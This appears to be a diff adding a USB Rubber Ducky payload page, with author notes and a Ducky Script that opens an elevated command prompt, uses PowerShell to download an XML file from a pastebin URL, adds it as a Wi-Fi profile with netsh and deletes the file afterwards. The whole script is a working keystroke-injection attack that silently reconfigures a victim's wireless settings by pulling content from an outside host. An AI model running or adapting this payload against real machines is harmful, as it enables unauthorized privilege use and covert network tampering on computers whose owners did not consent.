@@ -1,0 +1,27 @@
+* Author: Xcellerator
+* Description: Downloads an xml file from pastebin (using Mubix' powershell code) and the adds it to the wireless profiles using netsh. I used pastebin to keep the script small and quick. Cleans up afterwards - overall takes about 6-7 seconds.
+* Options: You might want to change the name of the access point, but you'll need to upload your own xml. The delay after the powershell command might also need to be tweaked.
+* Teensy Version: "http://pastebin.com/c9KSdNAe":http://pastebin.com/c9KSdNAe
+
+<pre><code>REM Brought to you by Xcellerator
+DEFAULT_DELAY 200
+DELAY 3000
+GUI r
+STRING cmd
+MENU
+STRING a
+ENTER
+LEFT
+ENTER
+STRING cd %TEMP%
+ENTER
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://pastebin.com/raw.php?i=8WsHSWdZ','%TEMP%\a.xml')
+ENTER
+DELAY 1000
+ENTER
+STRING netsh wlan add profile filename="a.xml" interface="Wireless Network Connection"
+ENTER
+STRING del a.xml
+ENTER
+STRING exit
+ENTER</code></pre>
